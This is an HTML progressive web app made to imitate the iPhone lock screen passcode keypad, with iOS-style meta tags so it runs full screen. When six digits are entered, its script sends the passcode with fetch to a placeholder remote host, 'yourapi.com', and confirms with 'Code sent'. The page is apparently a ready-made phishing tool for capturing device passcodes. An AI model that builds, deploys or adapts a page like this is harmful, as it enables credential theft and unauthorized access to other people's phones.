<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
    <meta name="theme-color" content="#000000">
    <title>iPhone Lock Screen</title>

    <!-- iPhone PWA icon -->
    <link rel="apple-touch-icon" href="icon.png">
    <link rel="manifest" href="manifest.json">

    <style>
        body {
            margin: 0;
            background-color: black;
            color: white;
            font-family: sans-serif;
            height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            flex-direction: column;
        }
        .passcode {
            display: grid;
            grid-template-columns: repeat(3, 80px);
            gap: 10px;
        }
        .btn {
            width: 80px;
            height: 80px;
            font-size: 24px;
            background-color: rgba(255,255,255,0.1);
            border: none;
            border-radius: 50%;
            color: white;
        }
        .dots {
            display: flex;
            gap: 10px;
            margin-bottom: 20px;
        }
        .dot {
            width: 12px;
            height: 12px;
            border-radius: 50%;
            border: 2px solid white;
            background: transparent;
        }
        .dot.filled {
            background: white;
        }
    </style>
</head>
<body>
    <div class="dots">
        <div class="dot"></div>
        <div class="dot"></div>
        <div class="dot"></div>
        <div class="dot"></div>
        <div class="dot"></div>
        <div class="dot"></div>
    </div>

    <div class="passcode">
        <button class="btn">1</button>
        <button class="btn">2</button>
        <button class="btn">3</button>
        <button class="btn">4</button>
        <button class="btn">5</button>
        <button class="btn">6</button>
        <button class="btn">7</button>
        <button class="btn">8</button>
        <button class="btn">9</button>
        <button class="btn">0</button>
    </div>

    <script>
        const dots = document.querySelectorAll('.dot');
        let code = '';

        document.querySelectorAll('.btn').forEach(btn => {
            btn.addEventListener('click', () => {
                if (code.length < 6) {
                    code += btn.textContent;
                    dots[code.length - 1].classList.add('filled');
                }
                if (code.length === 6) {
                    fetch(`https://yourapi.com?code=${code}`) // send to API
                        .then(() => alert("Code sent: " + code))
                        .catch(() => alert("Offline mode: saved code " + code));
                    setTimeout(resetDots, 500);
                }
            });
        });

        function resetDots() {
            code = '';
            dots.forEach(dot => dot.classList.remove('filled'));
        }

        // Register Service Worker
        if ('serviceWorker' in navigator) {
            navigator.serviceWorker.register('service-worker.js')
                .catch(err => console.error('SW registration failed:', err));
        }
    </script>
</body>
</html>
